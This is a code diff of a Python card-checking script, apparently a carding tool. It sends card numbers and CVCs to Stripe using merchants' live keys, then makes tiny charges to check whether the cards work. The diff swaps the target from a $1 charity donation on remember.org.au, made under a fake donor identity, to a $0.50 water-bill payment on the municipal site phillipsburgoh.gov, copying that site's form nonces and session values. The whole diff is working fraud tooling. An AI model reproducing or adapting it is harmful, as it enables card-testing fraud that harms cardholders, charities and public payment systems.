@@ -12,27 +12,6 @@ def Tele(ccx):
 	
 	random_amount1 = random.randint(1, 4)
 	random_amount2 = random.randint(1, 99)
-
-	headers = {
-	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Cache-Control': 'max-age=0',
-	    'Connection': 'keep-alive',
-	    'Sec-Fetch-Dest': 'document',
-	    'Sec-Fetch-Mode': 'navigate',
-	    'Sec-Fetch-Site': 'none',
-	    'Sec-Fetch-User': '?1',
-	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	}
-	
-	response = requests.get('https://remember.org.au/donate/', headers=headers)
-	
-	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
-	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
 	
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -50,88 +29,51 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+card-element&referrer=https%3A%2F%2Fphillipsburgoh.gov&time_on_page=26450&client_attribution_metadata[client_session_id]=8018fecc-d3f5-4677-b7ef-0584067cff33&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SCkbd2QFi1R5OccRFBjcVC35jII1s2C2aYbWzuJp5aQreP1hpaa3ZCwNdsANY1YQ9hzF5AUtsD15g8r1Y2nr5DN002qac1owB'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
-	headers = {
-	    'Accept': 'application/json, text/javascript, */*; q=0.01',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'Origin': 'https://remember.org.au',
-	    'Referer': 'https://remember.org.au/donate/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'same-origin',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'X-Requested-With': 'XMLHttpRequest',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
+	cookies = {
+	    '_ga_3DSWE1FTZP': 'GS2.1.s1769730633$o1$g0$t1769730633$j60$l0$h0',
+	    '_ga': 'GA1.1.1180704883.1769730634',
+	    '__stripe_mid': 'c9ee2967-bfec-4765-a433-9cf71448f56b1999d3',
+	    '__stripe_sid': '77ef95ae-545c-4388-8c8d-8a5a3bc8d14f47d1ab',
 	}
 	
-	data = {
-	    'charitable_form_id': f'{form_id}',
-	    f'{form_id}': '',
-	    '_charitable_donation_nonce': f'{donation_nonce}',
-	    '_wp_http_referer': '/donate/',
-	    'campaign_id': '13890',
-	    'description': 'Donate',
-	    'ID': '0',
-	    'gateway': 'stripe',
-	    'donation_amount': 'custom',
-	    'custom_donation_amount': '1.00',
-	    'title': '',
-	    'first_name': 'Gen',
-	    'last_name': 'Paypal',
-	    'email': 'genpaypal01@gmail.com',
-	    'phone_type': '0',
-	    'phone': '4303000850',
-	    'address': '',
-	    'city': '',
-	    'state': '0',
-	    'postcode': '',
-	    'country': 'AU',
-	    'donation_reason': '',
-	    'stripe_payment_method': f'{pm}',
-	    'action': 'make_donation',
-	    'form_action': 'make_donation',
-	}
-	
-	response = requests.post('https://remember.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
-	
-	try:
-		scrt = response.json().get('secret')
-		if not scrt:
-			return response.text
-		pi = re.search(r"(pi_[^_]+)", scrt)
-		pi = pi.group(1)
-	except Exception:
-		return response.text	
-	
 	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
+	    'authority': 'phillipsburgoh.gov',
+	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': '_ga_3DSWE1FTZP=GS2.1.s1769730633$o1$g0$t1769730633$j60$l0$h0; _ga=GA1.1.1180704883.1769730634; __stripe_mid=c9ee2967-bfec-4765-a433-9cf71448f56b1999d3; __stripe_sid=77ef95ae-545c-4388-8c8d-8a5a3bc8d14f47d1ab',
+	    'origin': 'https://phillipsburgoh.gov',
+	    'referer': 'https://phillipsburgoh.gov/water-bill/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
+	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz&client_attribution_metadata[client_session_id]=ee8d412f-c6a6-47a3-a1ee-1ccae1178a5b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'
+	params = {
+	    't': '1769730656959',
+	}
+	
+	data = {
+	    'data': f'__fluent_form_embded_post_id=3739&_fluentform_10_fluentformnonce=8604135121&_wp_http_referer=%2Fwater-bill%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&input_text=&numeric_field=&phone=&email=&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '10',
+	}
 	
 	response = requests.post(
-	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
+	    'https://phillipsburgoh.gov/wp-admin/admin-ajax.php',
+	    params=params,
+	    #cookies=cookies,
 	    headers=headers,
 	    data=data,
 	)
